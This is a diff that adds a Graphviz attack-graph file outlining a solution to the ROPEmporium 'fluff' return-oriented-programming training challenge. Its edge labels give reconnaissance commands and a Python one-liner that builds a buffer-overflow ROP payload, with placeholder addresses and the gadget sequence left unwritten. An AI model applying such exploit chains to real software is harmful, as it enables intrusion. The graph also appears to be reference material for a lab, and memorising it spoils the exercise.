@@ -1,0 +1,23 @@
+digraph AttackGraph {
+  rankdir=LR;
+  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium fluff"];
+  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
+  edge [color="#555555", fontname="Helvetica", fontsize=10];
+
+  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
+  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
+  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Writable memory identified"];
+  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Useful awkward gadgets identified"];
+  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Write primitive reconstructed"];
+  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="print_file located"];
+  node5 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ROP payload crafted"];
+  node6 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];
+
+  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q ./fluff"];
+  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="readelf -S fluff"];
+  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d fluff | grep questionableGadgets -A 40"];
+  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d fluff | grep questionableGadgets -A 40"];
+  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d fluff | grep print_file"];
+  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; data=0xDATA_ADDR; print_file=0xPRINT_FILE; xlat=0xXLATB; bextr=0xBEXTR; stos=0xSTOSB; pop_rdi=0xPOP_RDI_RET; chain=pad; chain += b'<repeat gadget sequence to synthesize and store each byte of flag.txt at DATA_ADDR>'; chain += pack('<Q', pop_rdi)+pack('<Q', data)+pack('<Q', print_file); sys.stdout.buffer.write(chain)\" > payload.bin"];
+  node5 -> node6 [color="#555555", fontname="Helvetica", fontsize="10", label="./fluff < payload.bin"];
+}
